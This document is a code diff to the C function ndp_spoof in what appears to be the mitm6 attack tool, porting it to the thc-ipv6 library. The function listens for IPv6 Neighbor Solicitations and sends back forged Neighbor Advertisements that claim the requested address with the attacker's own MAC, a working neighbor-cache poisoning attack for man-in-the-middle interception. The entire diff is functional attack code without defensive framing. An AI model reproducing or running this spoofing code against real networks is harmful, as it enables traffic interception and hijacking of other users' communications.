@@ -20,59 +20,46 @@
 #include <string.h>
 
 #include "mitm6.h"
-#include "packet.h"
-#include "protocols.h"
+#include "thc-ipv6.h"
 
 extern char *iface;
 
 void ndp_spoof(const u_char *bytes, size_t len)
 {
-        struct ether *ether = NULL;
-        struct ip6 *ip = NULL;
-        struct icmp6 *icmp = NULL;
-        struct icmp6_nd_ns *ns = NULL;
-        char s1[INET6_ADDRSTRLEN], s2[INET6_ADDRSTRLEN];
-        struct packet *p = NULL;
-        u_char *mac = NULL;
+        u_char *buf = (u_char *)bytes;
+        u_char *packet = NULL;
+        int buflen = 0;
+        u_char icmp_data[24];
 
-        ether = (struct ether *)bytes;
-        ip = (struct ip6 *)(bytes + sizeof(struct ether));
+        u_char *mac = thc_get_own_mac(iface);
+        if (mac == NULL)
+                fatal("unable to get own mac address for %s iface", iface);
 
-        if (ip->nxt == IP6_NXT_ICMP6) {
-                icmp = (struct icmp6 *)(bytes + sizeof(struct ether) + sizeof(struct ip6));
-        } else {
-                /* TODO */
-                fatal("no ICMPv6 packet!!! Skipping...");
-                return;
-        }
-        
-        if (icmp->type == ICMP6_T_ND_NS) {
+        if (buf[20] == NXT_ICMP6 && buf[54] == ICMP6_NEIGHBORSOL) {
 
-                mac = get_mac(iface);
-                if (mac == NULL)
+                thc_dump_data((u_char *)bytes, len, "Recv Pkt");
+
+                packet = thc_create_ipv6(iface, PREFER_LINK, &buflen, buf + 62, buf + 22, 255, 0, 0, 0, 0);
+                if (packet == NULL) {
+                        fatal("IPv6 packet not created");
                         return;
+                }
                 
-                if (memcmp(mac, ether->src, ETH_ADDR_LEN) == 0) {
-                        free(mac);
+                bzero(icmp_data, sizeof(icmp_data));
+                memcpy(icmp_data, buf + 62, 16);
+                icmp_data[16] = 2;
+                icmp_data[17] = 1;
+                memcpy(icmp_data + 18, mac, 6);
+
+                if (thc_add_icmp6(packet, &buflen, ICMP6_NEIGHBORADV, 0, ICMP6_NEIGHBORADV_OVERRIDE | ICMP6_NEIGHBORADV_SOLICIT, 
+                                  icmp_data, sizeof(icmp_data), 0) < 0) {
+                        fatal("ICMPv6 header not appended");
                         return;
                 }
 
-                ns = (struct icmp6_nd_ns *)(bytes + sizeof(struct ether) + sizeof(struct ip6) + sizeof(struct icmp6));
-
-                bzero(s1, INET6_ADDRSTRLEN);
-                inet_ntop(AF_INET6, ns->target, s1, INET6_ADDRSTRLEN);
-                bzero(s2, INET6_ADDRSTRLEN);
-                inet_ntop(AF_INET6, ip->src, s2, INET6_ADDRSTRLEN);
-
-                printf("Spoofing %s with target %s\n", s2, s1);
-
-                p = packet_init();
-                packet_add_ether(p, mac, ether->src, ETH_TYPE_IP6);
-                packet_add_ip6(p, sizeof(struct icmp6) + sizeof(struct icmp6_nd_na), IP6_NXT_ICMP6, IP6_HLIM, ns->target, ip->src);
-                packet_add_icmp6_nd_na(p, ICMP6_ND_NA_F_SOLICIT | ICMP6_ND_NA_F_OVERRIDE, ns->target);
-                packet_send(iface, p);
-                packet_free(p);
-
-                free(mac);
+                thc_generate_and_send_pkt(iface, mac, buf + 6, packet, &buflen);
+                packet = thc_destroy_packet(packet);
         }
+
+        free(mac);
 }
